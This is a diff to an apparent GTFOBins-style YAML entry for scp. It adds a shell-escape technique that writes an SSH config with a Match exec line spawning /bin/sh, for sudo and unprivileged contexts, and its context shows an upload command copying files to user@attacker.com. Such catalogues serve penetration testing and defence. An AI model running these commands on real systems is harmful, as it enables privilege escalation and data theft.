@@ -25,6 +25,13 @@ functions:
       suid:
         shell: true
       unprivileged:
+  - code: |-
+      echo 'Match exec "/bin/sh 0<&2 1>&2"' > "$HOME/.ssh/config"; scp -F ~/.ssh/config localhost:~/.ssh/config localhost
+    comment: |-
+      Spawns the shell on the client, doesn't have to be the official config file location
+    contexts:
+      sudo:
+      unprivileged:           
   upload:
   - code: |-
       scp /path/to/input-file user@attacker.com:/path/to/output-file
